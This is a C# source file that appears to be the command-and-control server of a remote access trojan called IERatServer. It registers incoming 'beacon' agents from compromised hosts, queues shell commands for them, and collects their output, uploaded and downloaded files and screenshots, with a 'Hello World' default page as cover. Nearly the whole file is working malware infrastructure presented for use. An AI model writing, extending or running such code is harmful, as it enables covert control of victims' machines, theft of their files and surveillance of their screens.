﻿using System;
using System.Threading.Tasks;
using WatsonWebserver;
using IERatServer.lib;
using Newtonsoft.Json;

namespace IERatServer
{
    class API
    {
        public static void Start(string IP, int Port)
        {
            // change on true for ssl , should work on linux
            // for windows use - https://github.com/jchristn/WatsonWebserver/wiki/Using-SSL-on-Windows
            Server s = new(IP, Port, false, DefaultRoute);
            try { s.Start();
                Logger.Log("info", $"Server Started at address {IP}:{Port}");
            }
            catch (Exception ex) { 
                Console.WriteLine(ex.GetBaseException().Message);
                Logger.Log("error", ex.GetBaseException().Message);
            }
        }

        [StaticRoute(HttpMethod.POST, "/api/v1/fetch")]
        public static async Task FetchCommandRoute(HttpContext ctx)
        {
            ctx.Response.StatusCode = 200;
            try
            {
                // get request object
                RequestObject requestObject = ctx.Request.DataAsJsonObject<RequestObject>();
                // print command results and save to history
                foreach (TaskObject taskObject in requestObject.CompletedTasks)
                {
                    if ((taskObject.Type == "download") || (taskObject.Type == "upload") || (taskObject.Type == "screenshot"))
                    {
                        Actions.HandleAdvancedTasks(requestObject, taskObject);
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"\nCommand Output received [{taskObject.Type} command]: {taskObject.Result}\n");
                        Logger.Log("info", $"Command Output received from agent {requestObject.AgentID}: [{taskObject.Type} command]: {taskObject.Result}");
                        Console.ForegroundColor = ConsoleColor.White;

                        AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == CLI.InteractContext);
                        var agent = ActiveChannel.agent;

                        Db.TaskHistory.Add(new TaskHistoryObject() { 
                            AgentID = requestObject.AgentID,
                            AgentNumber = ActiveChannel.InteractNum,
                            task = taskObject });

                        if (taskObject.Type == "cd")
                        {
                            if (ActiveChannel != null)
                            {
                                agent.Cwd = taskObject.Result.Split(new string[] { " " }, StringSplitOptions.None)[3];
                                CLI.loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
                            }
                        }
                    }                  
                }

                if (Db.GetChannelFromID(requestObject.AgentID) != null) { Db.GetChannelFromID(requestObject.AgentID).UpdateHeartBeatTime(); }

                ResponseObject responseObject = new()
                {
                    Type = "NewTask",
                    Task = GetTaskFromAgent(requestObject.AgentID),
                    Notes = "",
                };
                var responseString = JsonConvert.SerializeObject(responseObject);
                await ctx.Response.Send(ServerUtils.GenerateResponse(responseString));
            }

            catch (Exception ex)
            {
                Console.WriteLine("\nError - " + ex.Message);
                Logger.Log("error", $"ex.Message");
            }
        }

        [StaticRoute(HttpMethod.POST, "/api/v1/auth")]
        public static async Task AuthRoute(HttpContext ctx)
        {
            try
            {
                ctx.Response.StatusCode = 200;
                Agent beacon = ctx.Request.DataAsJsonObject<Agent>();
                ResponseObject responseObject = new()
                {
                    Type = "NewAgent",
                    Task = null,
                    Notes = "Ok",
                };
                if (!Db.AgentExists(beacon.ID))
                {
                    responseObject.Notes = "Authenticated";
                    var newSessionNumber = Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine($"\nNew session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
                    Logger.Log("info", $"New session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                var responseString = JsonConvert.SerializeObject(responseObject);
                await ctx.Response.Send(ServerUtils.GenerateResponse(responseString));
            }
            catch (Exception ex)
            {
                Console.WriteLine("\nError - " + ex.Message);
                Logger.Log("error", ex.Message);
            }
        }
        static async Task DefaultRoute(HttpContext ctx)
        {
            await ctx.Response.Send("Hello World");
        }
        public static TaskObject GetTaskFromAgent(Guid ID)
        {
            AgentChannel Channel = Db.channels.Find(Channel => Channel.agent.ID == ID);
            if (Channel != null)
            {
                if (Channel.agent.AgentTasks.Count != 0) {
                    var TaskToRun = Channel.agent.AgentTasks.Dequeue();
                    TaskToRun.Status = "In Progress";
                    return TaskToRun;
                }
                else
                {
                    return null;
                }
            }
            else {
                TaskObject ResetConnectionTask = new TaskObject { Type = "Reset" };
                return ResetConnectionTask;
            }            
        }
    }
}